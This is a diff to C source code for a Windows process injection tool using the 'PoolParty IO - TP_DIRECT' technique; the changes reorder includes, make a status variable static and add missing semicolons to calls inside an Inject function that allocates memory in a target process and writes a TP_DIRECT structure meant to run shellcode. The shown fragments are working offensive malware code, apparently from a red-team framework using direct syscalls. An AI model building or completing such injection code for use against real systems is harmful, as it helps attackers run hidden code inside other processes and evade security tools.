@@ -2,18 +2,19 @@
     Technique: PoolParty IO - TP_DIRECT
 */
 
+#include <windows.h>
+#include <unwin.h>
+
+#include <stdio.h>
+
+#include <ThreadPool.h>
+
 #include "injection.h"
 #include "../syscalls/syscalls.h"
 
 extern Ade GlobalAde;
 
-#include <stdio.h>
-#include <windows.h>
-#include <unwin.h>
-
-#include <ThreadPool.h>
-
-NTSTATUS status;
+static NTSTATUS status;
 
 HANDLE DuplicateHandleK(HANDLE hproc, int pPid, int handleType) {
     HANDLE handleDuplicated;
@@ -78,7 +79,7 @@ int Inject(HANDLE targetProcHandle, HANDLE completionIoHandle, LPVOID ptrShellco
         &AllocSize,
         MEM_COMMIT | MEM_RESERVE,
         PAGE_READWRITE
-    )
+    );
 
     if (remoteTpDirect == NULL || status != 0x0) {
 #ifdef DEBUG
@@ -94,7 +95,7 @@ int Inject(HANDLE targetProcHandle, HANDLE completionIoHandle, LPVOID ptrShellco
         &tpDirect,
         sizeof(TP_DIRECT),
         NULL
-    )
+    );
 
     if (status != 0x0) {
 #ifdef DEBUG
@@ -112,7 +113,7 @@ int Inject(HANDLE targetProcHandle, HANDLE completionIoHandle, LPVOID ptrShellco
         0,
         0,
         0
-    )
+    );
 
     if (status != 0x0) {
 #ifdef DEBUG
